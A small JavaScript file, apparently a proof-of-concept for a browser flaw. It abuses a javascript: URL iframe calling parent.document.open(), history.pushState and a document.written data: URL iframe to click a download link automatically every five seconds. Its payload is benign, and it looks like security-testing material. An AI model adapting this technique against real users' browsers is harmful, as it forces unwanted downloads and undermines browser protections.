window.addEventListener("load", onLoad);

function onLoad(event) {
    var iframe = document.getElementById("iframe");

    iframe.src = "javascript: parent.document.open()";

    setTimeout(() => {
   
        history.pushState({}, "");

        var dataIframe = document.createElement("iframe");

        const src = `
        <a href="data:,www.google.com" id="download-link" download></a>

        <script>
            var downloadLink = document.getElementById("download-link");

            setInterval(function () {
                downloadLink.click();
            }, 5000);
        </script>
        `;

        dataIframe.src = "data:text/html," + src;

        document.write(dataIframe.outerHTML);
    }, 1000);
}
